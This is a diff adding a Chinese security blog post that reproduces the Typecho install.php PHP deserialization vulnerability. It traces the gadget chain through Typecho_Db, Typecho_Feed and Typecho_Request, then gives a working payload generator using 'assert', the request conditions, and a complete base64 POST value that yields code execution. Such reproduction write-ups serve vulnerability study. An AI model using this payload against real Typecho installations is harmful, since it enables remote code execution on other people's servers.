@@ -1,0 +1,510 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content>
+    <meta name="keyword" content>
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>
+        
+          Typecho反序列化漏洞复现 - Kingkk&#39;s Blog
+        
+    </title>
+
+    <link rel="canonical" href="https://www.kingkk/2018/07/Typecho反序列化漏洞复现/">
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="/css/bootstrap.min.css">
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/hux-blog.min.css">
+
+    <!-- Pygments Highlight CSS -->
+    <link rel="stylesheet" href="/css/highlight.css">
+
+    <!-- Custom Fonts -->
+    <!-- <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css" rel="stylesheet" type="text/css"> -->
+    <!-- Hux change font-awesome CDN to qiniu -->
+    <link href="https://cdn.staticfile.org/font-awesome/4.5.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+
+    <!-- Hux Delete, sad but pending in China
+    <link href='http://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
+    <link href='http://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/
+    css'>
+    -->
+
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- ga & ba script hoook -->
+    <script></script>
+</head>
+
+
+<!-- hack iOS CSS :active style -->
+<body ontouchstart="">
+
+    <!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+    <div class="container-fluid">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="/">Kingkk&#39;s Blog</a>
+        </div>
+
+        <!-- Collect the nav links, forms, and other content for toggling -->
+        <!-- Known Issue, found by Hux:
+            <nav>'s height woule be hold on by its content.
+            so, when navbar scale out, the <nav> will cover tags.
+            also mask any touch event of tags, unfortunately.
+        -->
+        <div id="huxblog_navbar">
+            <div class="navbar-collapse">
+                <ul class="nav navbar-nav navbar-right">
+                    <li>
+                        <a href="/">Home</a>
+                    </li>
+
+                    
+
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/about/">About</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/archives/">Archives</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/tags/">Tags</a>
+                        </li>
+                        
+                    
+                    
+                </ul>
+            </div>
+        </div>
+        <!-- /.navbar-collapse -->
+    </div>
+    <!-- /.container -->
+</nav>
+<script>
+    // Drop Bootstarp low-performance Navbar
+    // Use customize navbar with high-quality material design animation
+    // in high-perf jank-free CSS3 implementation
+    var $body   = document.body;
+    var $toggle = document.querySelector('.navbar-toggle');
+    var $navbar = document.querySelector('#huxblog_navbar');
+    var $collapse = document.querySelector('.navbar-collapse');
+
+    $toggle.addEventListener('click', handleMagic)
+    function handleMagic(e){
+        if ($navbar.className.indexOf('in') > 0) {
+        // CLOSE
+            $navbar.className = " ";
+            // wait until animation end.
+            setTimeout(function(){
+                // prevent frequently toggle
+                if($navbar.className.indexOf('in') < 0) {
+                    $collapse.style.height = "0px"
+                }
+            },400)
+        }else{
+        // OPEN
+            $collapse.style.height = "auto"
+            $navbar.className += " in";
+        }
+    }
+</script>
+
+
+    <!-- Main Content -->
+    
+<!-- Image to hack wechat -->
+<!-- <img src="https://www.kingkk/img/icon_wechat.png" width="0" height="0"> -->
+<!-- <img src="{{ site.baseurl }}/{% if page.header-img %}{{ page.header-img }}{% else %}{{ site.header-img }}{% endif %}" width="0" height="0"> -->
+
+<!-- Post Header -->
+<style type="text/css">
+    header.intro-header{
+        background-image: url('/img/home-bg.jpg')
+    }
+</style>
+<header class="intro-header" >
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <div class="post-heading">
+                    <div class="tags">
+                        
+                          <a class="tag" href="/tags/#php" title="php">php</a>
+                        
+                          <a class="tag" href="/tags/#代码审计" title="代码审计">代码审计</a>
+                        
+                          <a class="tag" href="/tags/#反序列化" title="反序列化">反序列化</a>
+                        
+                    </div>
+                    <h1>Typecho反序列化漏洞复现</h1>
+                    <h2 class="subheading"></h2>
+                    <span class="meta">
+                        Posted by kingkk on
+                        2018-07-21
+                    </span>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+
+    <!-- Post Container -->
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                post-container">
+
+                <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>之前一直就听过这个漏洞，影响还是蛮大的。但是之前一直没有时间复现。<br>最近想着没有搞过这个类型的漏洞，恰好这里有一个活生生的案例，就把php反序列化总结了下，分析了下这个漏洞。<br>看完分析文章，我只想说，流批。叫我就算告诉我这有漏洞我也找不到触发链。orz  </p>
+<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>漏洞发生在install.php中。直接搜索<code>unserialize</code>关键字就能找到，大约283行的样子<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$config = unserialize(base64_decode(Typecho_Cookie::get(<span class="string">'__typecho_config'</span>)));</span><br></pre></td></tr></table></figure></p>
+<p>跟进Typecho_Cookie中的get方法<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($key, $default = NULL)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	$key = <span class="keyword">self</span>::$_prefix . $key;</span><br><span class="line">	$value = <span class="keyword">isset</span>($_COOKIE[$key]) ? $_COOKIE[$key] : (<span class="keyword">isset</span>($_POST[$key]) ? $_POST[$key] : $default);</span><br><span class="line">	<span class="keyword">return</span> is_array($value) ? $default : $value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>可以通过cookie或者post的方式传入，这样传入unserialize的变量就是可控的  </p>
+<p>接下来分析下要进入这里的逻辑流程<br>只要绕过一开始的这两个代码逻辑即可<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//判断是否已经安装</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">'finish'</span>]) &amp;&amp; file_exists(__TYPECHO_ROOT_DIR__ . <span class="string">'/config.inc.php'</span>) &amp;&amp; <span class="keyword">empty</span>($_SESSION[<span class="string">'typecho'</span>])) &#123;</span><br><span class="line">	<span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 挡掉可能的跨站请求</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($_GET) || !<span class="keyword">empty</span>($_POST)) &#123;</span><br><span class="line">	<span class="keyword">if</span> (<span class="keyword">empty</span>($_SERVER[<span class="string">'HTTP_REFERER'</span>])) &#123;</span><br><span class="line">		<span class="keyword">exit</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	$parts = parse_url($_SERVER[<span class="string">'HTTP_REFERER'</span>]);</span><br><span class="line">	<span class="keyword">if</span> (!<span class="keyword">empty</span>($parts[<span class="string">'port'</span>]) &amp;&amp; $parts[<span class="string">'port'</span>] != <span class="number">80</span> &amp;&amp; !Typecho_Common::isAppEngine()) &#123;</span><br><span class="line">		$parts[<span class="string">'host'</span>] = <span class="string">"&#123;$parts['host']&#125;:&#123;$parts['port']&#125;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="keyword">empty</span>($parts[<span class="string">'host'</span>]) || $_SERVER[<span class="string">'HTTP_HOST'</span>] != $parts[<span class="string">'host'</span>]) &#123;</span><br><span class="line">		<span class="keyword">exit</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>修改下http头的参数，以及get参数，即可满足要求  </p>
+<p>然继续分析反序列化的利用<br>在反序列化下面就有这样一行代码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$installDb = <span class="keyword">new</span> Typecho_Db($config[<span class="string">'adapter'</span>], $config[<span class="string">'prefix'</span>]);</span><br></pre></td></tr></table></figure></p>
+<p>看到这里调用了$config来实例化一个db类<br>在Typecho_Db中的construct类就可以看到<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($adapterName, $prefix = <span class="string">'typecho_'</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">/** 获取适配器名称 */</span></span><br><span class="line">	<span class="keyword">$this</span>-&gt;_adapterName = $adapterName;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/** 数据库适配器 */</span></span><br><span class="line">	$adapterName = <span class="string">'Typecho_Db_Adapter_'</span> . $adapterName;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!call_user_func(<span class="keyword">array</span>($adapterName, <span class="string">'isAvailable'</span>))) &#123;</span><br><span class="line">		<span class="keyword">throw</span> <span class="keyword">new</span> Typecho_Db_Exception(<span class="string">"Adapter &#123;$adapterName&#125; is not available"</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">$this</span>-&gt;_prefix = $prefix;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/** 初始化内部变量 */</span></span><br><span class="line">	<span class="keyword">$this</span>-&gt;_pool = <span class="keyword">array</span>();</span><br><span class="line">	<span class="keyword">$this</span>-&gt;_connectedPool = <span class="keyword">array</span>();</span><br><span class="line">	<span class="keyword">$this</span>-&gt;_config = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">	<span class="comment">//实例化适配器对象</span></span><br><span class="line">	<span class="keyword">$this</span>-&gt;_adapter = <span class="keyword">new</span> $adapterName();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>里面将传入的变量与字符串相连接，会触发默认的<code>__toString</code>方法<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$adapterName = <span class="string">'Typecho_Db_Adapter_'</span> . $adapterName;</span><br></pre></td></tr></table></figure></p>
+<p>这里找到<code>var\Typecho\Feed.php</code>中的Feed类定义了<code>__toString</code>方法<br>由于代码段有点长，就放上最主要的部分<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;_items <span class="keyword">as</span> $item) &#123;</span><br><span class="line">				$content .= <span class="string">'&lt;item&gt;'</span> . <span class="keyword">self</span>::EOL;</span><br><span class="line">				$content .= <span class="string">'&lt;title&gt;'</span> . htmlspecialchars($item[<span class="string">'title'</span>]) . <span class="string">'&lt;/title&gt;'</span> . <span class="keyword">self</span>::EOL;</span><br><span class="line">				$content .= <span class="string">'&lt;link&gt;'</span> . $item[<span class="string">'link'</span>] . <span class="string">'&lt;/link&gt;'</span> . <span class="keyword">self</span>::EOL;</span><br><span class="line">				$content .= <span class="string">'&lt;guid&gt;'</span> . $item[<span class="string">'link'</span>] . <span class="string">'&lt;/guid&gt;'</span> . <span class="keyword">self</span>::EOL;</span><br><span class="line">				$content .= <span class="string">'&lt;pubDate&gt;'</span> . <span class="keyword">$this</span>-&gt;dateFormat($item[<span class="string">'date'</span>]) . <span class="string">'&lt;/pubDate&gt;'</span> . <span class="keyword">self</span>::EOL;</span><br><span class="line">				$content .= <span class="string">'&lt;dc:creator&gt;'</span> . htmlspecialchars($item[<span class="string">'author'</span>]-&gt;screenName) . <span class="string">'&lt;/dc:creator&gt;'</span> . <span class="keyword">self</span>::EOL;</span><br></pre></td></tr></table></figure></p>
+<p>可以看到这里<code>$item[&#39;author&#39;]-&gt;screenName</code>,对循环出来的变量获取<code>screenName</code>属性，从而会触发默认的<code>__get</code>方法<br>这里的循环变量<code>$this-&gt;_items</code>恰好也是反序列化能够控制的类中的变量  </p>
+<p>然后找到一处<code>var\Typecho\Request.php</code>类中的<code>__get</code>方法<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get($key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>继续跟进<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($key, $default = NULL)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">switch</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">		<span class="keyword">case</span> <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;_params[$key]):</span><br><span class="line">			$value = <span class="keyword">$this</span>-&gt;_params[$key];</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="keyword">isset</span>(<span class="keyword">self</span>::$_httpParams[$key]):</span><br><span class="line">			$value = <span class="keyword">self</span>::$_httpParams[$key];</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">default</span>:</span><br><span class="line">			$value = $default;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	$value = !is_array($value) &amp;&amp; strlen($value) &gt; <span class="number">0</span> ? $value : $default;</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">$this</span>-&gt;_applyFilter($value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>前面都没什么问题，主要是最后一句<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;_applyFilter($value);</span><br></pre></td></tr></table></figure></p>
+<p>进行看一下这个函数<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">_applyFilter</span><span class="params">($value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;_filter) &#123;</span><br><span class="line">		<span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;_filter <span class="keyword">as</span> $filter) &#123;</span><br><span class="line">			$value = is_array($value) ? array_map($filter, $value) :</span><br><span class="line">			call_user_func($filter, $value);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">$this</span>-&gt;_filter = <span class="keyword">array</span>();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> $value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>执行代码的地方来了<code>call_user_func</code></p>
+<blockquote>
+<p>call_user_func — 把第一个参数作为回调函数调用<br><code>$this-&gt;_filter</code>是反序列化时可以控制的<br>传入的$value参数在之前也是通过<code>$value = $this-&gt;_params[$key];</code>获取  </p>
+</blockquote>
+<p>从而一个复杂的反序列化攻击链就完成了</p>
+<h1 id="漏洞攻击"><a href="#漏洞攻击" class="headerlink" title="漏洞攻击"></a>漏洞攻击</h1><p>payload<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Feed</span></span>&#123;</span><br><span class="line">	<span class="keyword">const</span> RSS1 = <span class="string">'RSS 1.0'</span>;</span><br><span class="line">	<span class="keyword">const</span> RSS2 = <span class="string">'RSS 2.0'</span>;</span><br><span class="line">	<span class="keyword">const</span> ATOM1 = <span class="string">'ATOM 1.0'</span>;</span><br><span class="line">	<span class="keyword">const</span> DATE_RFC822 = <span class="string">'r'</span>;</span><br><span class="line">	<span class="keyword">const</span> DATE_W3CDTF = <span class="string">'c'</span>;</span><br><span class="line">	<span class="keyword">const</span> EOL = <span class="string">"\n"</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">private</span> $_items = <span class="keyword">array</span>();</span><br><span class="line">	<span class="keyword">private</span> $_type;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;_type = <span class="keyword">self</span>::RSS2 ;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;_items[<span class="number">0</span>] = <span class="keyword">array</span>(</span><br><span class="line">			<span class="string">'title'</span> =&gt; <span class="string">'1'</span>,</span><br><span class="line">			<span class="string">'link'</span> =&gt; <span class="string">'1'</span>,</span><br><span class="line">			<span class="string">'date'</span> =&gt; <span class="number">1508895132</span>,</span><br><span class="line">			<span class="string">'category'</span> =&gt; <span class="keyword">array</span>(<span class="keyword">new</span> Typecho_Request()),</span><br><span class="line">			<span class="string">'author'</span> =&gt; <span class="keyword">new</span> Typecho_Request()</span><br><span class="line">		);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Request</span></span>&#123;</span><br><span class="line">	<span class="keyword">private</span> $_filter = <span class="keyword">array</span>();</span><br><span class="line">	<span class="keyword">private</span> $_params = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;_params[<span class="string">'screenName'</span>] = <span class="string">'phpinfo();'</span>;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;_filter[<span class="number">0</span>] = <span class="string">'assert'</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$exp = <span class="keyword">array</span>(</span><br><span class="line">	<span class="string">'adapter'</span> =&gt; <span class="keyword">new</span> Typecho_Feed(),</span><br><span class="line">	<span class="string">'prefix'</span> =&gt; <span class="string">'typecho_'</span>,</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">print_r(base64_encode(serialize($exp)));</span><br></pre></td></tr></table></figure></p>
+<p>关于这个payload有两点要说下<br>一就是<code>&#39;catetory&#39;</code>这个数组中，只要任意传入一个类即可，否则会报database error，具体原因暂不知<br>二就是我一开始想用eval的，然后就会报没有eval函数的错误，可能是把eval函数给禁用了  </p>
+<p>然补上之前的进入条件<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reference = http:<span class="regexp">//</span>localhost<span class="regexp">/typecho/</span></span><br><span class="line">?finish=a</span><br></pre></td></tr></table></figure></p>
+<p>用post传入<br><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__typecho_config=YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6Mjp7czoyMDoiAFR5cGVjaG9fRmVlZABfaXRlbXMiO2E6MTp7aTowO2E6NTp7czo1OiJ0aXRsZSI7czoxOiIxIjtzOjQ6ImxpbmsiO3M6MToiMSI7czo0OiJkYXRlIjtpOjE1MDg4OTUxMzI7czo4OiJjYXRlZ29yeSI7YToxOntpOjA7TzoxNToiVHlwZWNob19SZXF1ZXN0IjoyOntzOjI0OiIAVHlwZWNob19SZXF1ZXN0AF9maWx0ZXIiO2E6MTp7aTowO3M6NjoiYXNzZXJ0Ijt9czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfcGFyYW1zIjthOjE6e3M6MTA6InNjcmVlbk5hbWUiO3M6MTA6InBocGluZm8oKTsiO319fXM6NjoiYXV0aG9yIjtPOjE1OiJUeXBlY2hvX1JlcXVlc3QiOjI6e3M6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo2OiJhc3NlcnQiO31zOjI0OiIAVHlwZWNob19SZXF1ZXN0AF9wYXJhbXMiO2E6MTp7czoxMDoic2NyZWVuTmFtZSI7czoxMDoicGhwaW5mbygpOyI7fX19fXM6MTk6IgBUeXBlY2hvX0ZlZWQAX3R5cGUiO3M6NzoiUlNTIDIuMCI7fXM6NjoicHJlZml4IjtzOjg6InR5cGVjaG9fIjt9</span><br></pre></td></tr></table></figure></p>
+<p>即可getshell<br><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/Typecho反序列化漏洞复现/1.png" alt></p>
+<h1 id="Reference-Link"><a href="#Reference-Link" class="headerlink" title="Reference Link"></a>Reference Link</h1><p><a href="https://www.hackersb.cn/shenji/239.html" target="_blank" rel="noopener">https://www.hackersb.cn/shenji/239.html</a></p>
+
+
+                <hr>
+
+                
+
+                <ul class="pager">
+                    
+                        <li class="previous">
+                            <a href="/2018/08/迟学的哈希长度拓展攻击/" data-toggle="tooltip" data-placement="top" title="迟学的哈希长度扩展攻击">&larr; Previous Post</a>
+                        </li>
+                    
+                    
+                        <li class="next">
+                            <a href="/2018/07/php反序列化漏洞/" data-toggle="tooltip" data-placement="top" title="php反序列化漏洞">Next Post &rarr;</a>
+                        </li>
+                    
+                </ul>
+
+                
+
+                
+
+            </div>
+    <!-- Side Catalog Container -->
+        
+
+    <!-- Sidebar Container -->
+
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+                <!-- Featured Tags -->
+                
+                <section>
+                    <!-- no hr -->
+                    <h5><a href="/tags/">FEATURED TAGS</a></h5>
+                    <div class="tags">
+                       
+                          <a class="tag" href="/tags/#php" title="php">php</a>
+                        
+                          <a class="tag" href="/tags/#代码审计" title="代码审计">代码审计</a>
+                        
+                          <a class="tag" href="/tags/#反序列化" title="反序列化">反序列化</a>
+                        
+                    </div>
+                </section>
+                
+
+                <!-- Friends Blog -->
+                
+                <hr>
+                <h5>FRIENDS</h5>
+                <ul class="list-inline">
+
+                    
+                        <li><a href="//98587329.github.io" target="_blank">mt</a></li>
+                    
+                        <li><a href="//www.cflowerth.com" target="_blank">FAtwAER</a></li>
+                    
+                        <li><a href="//lufe1.cn" target="_blank">lufei</a></li>
+                    
+                        <li><a href="//0x3f97.github.io" target="_blank">gd</a></li>
+                    
+                        <li><a href="http://www.lsafe.org" target="_blank">4dmin$5</a></li>
+                    
+                        <li><a href="http://www.thekingofnight.com/" target="_blank">theKingOfNight</a></li>
+                    
+                        <li><a href="http://www.thekingofnight.com/" target="_blank">Hpdoger</a></li>
+                    
+                        <li><a href="//mochazz.github.io/" target="_blank">七月火</a></li>
+                    
+                        <li><a href="https://mengsec.com/" target="_blank">蒙尘</a></li>
+                    
+                        <li><a href="https://patrilic.top/" target="_blank">Patrilic</a></li>
+                    
+                        <li><a href="https://threedr3am.github.io/" target="_blank">threedr3am</a></li>
+                    
+                        <li><a href="http://rui0.cn/" target="_blank">Ruilin</a></li>
+                    
+                        <li><a href="https://zgao.top/" target="_blank">zgao</a></li>
+                    
+                        <li><a href="https://www.zfjsec.com/" target="_blank">zfjsec</a></li>
+                    
+                </ul>
+                
+            </div>
+
+        </div>
+    </div>
+</article>
+
+
+
+
+
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+<!-- anchor-js, Doc:http://bryanbraun.github.io/anchorjs/ -->
+<script>
+    async("https://cdn.bootcss.com/anchor-js/1.1.1/anchor.min.js",function(){
+        anchors.options = {
+          visible: 'always',
+          placement: 'right',
+          icon: '#'
+        };
+        anchors.add().remove('.intro-header h1').remove('.subheading').remove('.sidebar-container h5');
+    })
+</script>
+<style>
+    /* place left on bigger screen */
+    @media all and (min-width: 800px) {
+        .anchorjs-link{
+            position: absolute;
+            left: -0.75em;
+            font-size: 1.1em;
+            margin-top : -0.1em;
+        }
+    }
+</style>
+
+
+
+    <!-- Footer -->
+    <!-- Footer -->
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <ul class="list-inline text-center">
+                
+                
+                
+
+                
+
+                
+
+                
+                    <li>
+                        <a target="_blank"  href="https://github.com/kingkaki">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                
+
+                
+
+                </ul>
+                <p class="copyright text-muted">
+                    Copyright &copy; Kingkk&#39;s Blog 2022 
+                    浙ICP备17041487号
+                    <br>
+                    Theme by <a href="http://huangxuan.me">Hux</a> 
+                    <span style="display: inline-block; margin: 0 5px;">
+                        <i class="fa fa-heart"></i>
+                    </span> 
+                    Ported by <a href="http://blog.kaijun.rocks">Kaijun</a>
+
+                    <!-- | 
+                    <iframe
+                        style="margin-left: 2px; margin-bottom:-5px;"
+                        frameborder="0" scrolling="0" width="91px" height="20px"
